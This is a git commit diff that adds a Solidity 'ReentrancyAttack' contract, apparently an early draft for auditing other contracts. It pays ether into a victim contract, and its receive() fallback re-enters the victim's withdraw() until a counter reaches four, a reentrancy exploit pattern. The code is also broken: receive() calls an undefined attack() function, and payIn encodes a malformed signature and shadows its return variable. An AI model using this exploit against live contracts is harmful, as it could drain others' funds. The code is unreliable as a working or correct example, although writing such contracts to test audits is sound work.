c568479830983478dfbf45194f186d754f06b472
Lucas <114839922+lucassilver07@users.noreply.github.com>
2022-11-11 07:39:41 +0800

    basic concept

--- contracts/ReentrancyAttack.sol
+++ contracts/ReentrancyAttack.sol
@@ -1,11 +1,39 @@
 // SPDX-License-Identifier: UNLICENSED
-pragma solidity >=0.6.0 <0.9.0;
+pragma solidity 0.8.17;
 
 import "@openzeppelin/contracts/access/Ownable.sol";
 
 /**
- * @title Mock marketplace contract
- * @notice This is a mock contract to test the functionalities of the contract collection
+ * @title Reentrancy Attack contract
+ * @notice This is reentrancy attack contract to test other contracts for audit.
  */
 contract ReentrancyAttack is Ownable{
+    address public victim;
+    uint256 public contractBalance;
+    uint256 public amount;
+    uint256 public counter;
+
+    constructor(address _victim) payable {
+        victim = _victim;
+        amount = msg.value;
+    }
+
+    receive() external payable {
+        counter++;
+        attack();
+    }
+
+    function payIn() public returns (bool success) {
+        (bool success, bytes memory data) = payable(victim).call{value: amount}(abi.encodeWithSignature("payIn"));
+    }
+
+    function withdrawAttack() public {
+        if(counter < 4) {
+            payable(victim).call(abi.encodeWithSignature("withdraw()"));
+        }
+    }
+
+    function updateContractBalance() public {
+        contractBalance = address(this).balance;
+    }
 }
